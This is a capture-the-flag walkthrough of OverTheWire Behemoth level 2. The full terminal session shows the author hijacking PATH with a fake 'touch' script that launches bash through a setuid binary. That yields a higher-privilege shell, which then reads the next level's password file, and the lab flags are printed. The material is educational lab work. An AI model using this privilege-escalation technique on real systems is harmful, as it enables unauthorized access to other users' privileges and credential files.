# Behemoth Level 1 → Level 2 Environment Variables and Shellcode Injection

## Previous Flag
<b>IxPJbQtH8q</b>

## Goal
Be able to log onto OverTheWire SSH server: behemoth.labs.overthewire.org. Given user <b>behemoth2</b> and port <b>2221</b>.

There is no information for this level, intentionally.

## What I learned
```
Create variables in shell environment
Edit environment vairable like $PATH
/etc/shells contains all shells on system
PATH=$temp:$PATH
   $temp → expands to some directory path
   :$PATH → appends your old PATH after the new directory
   Note: PATH gets overwrite and when doing command touch it looking in Left side dir before right
```

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker> ssh behemoth2@behemoth.labs.overthewire.org -p 2221 ⌨️
behemoth2@behemoth:~$ cd /behemoth/ ⌨️
behemoth2@behemoth:/behemoth$ ./behemoth2 ⌨️
touch: cannot touch '1756720': Permission denied 👀 Denied creating touch file name 1756720
whoami ⌨️
^C ⌨️
behemoth2@behemoth:/behemoth$ ltrace ./behemoth2 ⌨️
__libc_start_main(0x80490fd, 1, 0xffffd454, 0 <unfinished ...>
getpid()                                                                                  = 1761186
sprintf("touch 1761186", "touch %d", 1761186)                                             = 13     
lstat(0xffffd30a, 0xffffd318, 0x1adfa2, 0x804920b)                                        = 0xffffffff
unlink("1761186")                                                                         = -1        
geteuid()                                                                                 = 13002     
geteuid()                                                                                 = 13002
setreuid(13002, 13002)                                                                    = 0
system("touch 1761186"touch: cannot touch '1761186': Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                    = 256
sleep(2000
^C <no return ...> ⌨️
--- SIGINT (Interrupt) ---
+++ killed by SIGINT +++
behemoth2@behemoth:/behemoth$ whatis touch ⌨️
touch (1)            - change file timestamps
behemoth2@behemoth:/behemoth$ man touch ⌨️

# Learn to create variables in shell environment
behemoth2@behemoth:/behemoth$ temp=$(mktemp -d) ⌨️❤️
behemoth2@behemoth:/behemoth$ echo $temp ⌨️
/tmp/tmp.QY7pXelKUL
behemoth2@behemoth:/behemoth$ chmod 777 $temp ⌨️
behemoth2@behemoth:/behemoth$ ls -la $temp ⌨️
total 40
drwxrwxrwx   2 behemoth2 behemoth2  4096 Aug 16 02:08 . 
drwxrwx-wt 569 root      root      32768 Aug 16 02:10 ..
behemoth2@behemoth:/behemoth$ cd $temp ⌨️
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ /behemoth/behemoth2 ⌨️          # Note: this time no touch error, bc we in tmp dir
whoami ⌨️
^C ⌨️
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ ls -la ⌨️
total 40
drwxrwxrwx   2 behemoth2 behemoth2  4096 Aug 16 02:11 .
drwxrwx-wt 570 root      root      32768 Aug 16 02:12 ..
-rw-rw-r--   1 behemoth3 behemoth2     0 Aug 16 02:11 1769769        # File is empty: 0 bytes
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ cat 1769769 ⌨️ 
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ which touch ⌨️
/usr/bin/touch
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ find / -type f -name "touch" 2>/dev/null ⌨️
/usr/bin/touch
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ cat /etc/shells ⌨️❤️
# /etc/shells: valid login shells
/bin/sh 👀
/usr/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/usr/bin/dash
/usr/bin/screen
/usr/bin/tmux
/usr/bin/showtext
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ vi touch ⌨️
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ cat touch ⌨️
/bin/bash
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ echo $PATH ⌨️      # current shell bin located
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
# Note: Reads from left to right, when add it goes to the left side (FIFO, High Priority Queue)

behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ chmod 777 touch ⌨️
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ ./touch ⌨️ 
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ exit ⌨️
exit ⌨️

# Add into PATH vairable the temp directory, should be in front
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ PATH=$temp:$PATH ⌨️❤️
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ echo $PATH ⌨️
/tmp/tmp.QY7pXelKUL👀:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

# Successfuly override touch shortcut
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ touch ⌨️             # Note: open whatever was written (shell in this case)
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ exit ⌨️
exit ⌨️
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ /behemoth/behemoth2 ⌨️
behemoth3@behemoth:/tmp/tmp.QY7pXelKUL$ whoami ⌨️
behemoth3
behemoth3@behemoth:/tmp/tmp.QY7pXelKUL$ cat /etc/behemoth_pass/behemoth3 ⌨️
JQ6tZGqt0i
behemoth3@behemoth:/tmp/tmp.QY7pXelKUL$ vi touch ⌨️
behemoth3@behemoth:/tmp/tmp.QY7pXelKUL$ cat touch ⌨️
cat /etc/behemoth_pass/behemoth3 ⌨️
behemoth3@behemoth:/tmp/tmp.QY7pXelKUL$ /behemoth/behemoth2 ⌨️
JQ6tZGqt0i 🔐
exit ⌨️
^C ⌨️
behemoth3@behemoth:/tmp/tmp.QY7pXelKUL$ exit ⌨️
exit ⌨️
/tmp/tmp.QY7pXelKUL/touch: 2: ehemoth_pass/behemoth3: not found
^C ⌨️
behemoth2@behemoth:/tmp/tmp.QY7pXelKUL$ /behemoth/behemoth2 ⌨️
JQ6tZGqt0i 🔐
```

## Flag
<b>JQ6tZGqt0i</b>

## Continue
[Continue](./Behemoth0203.md)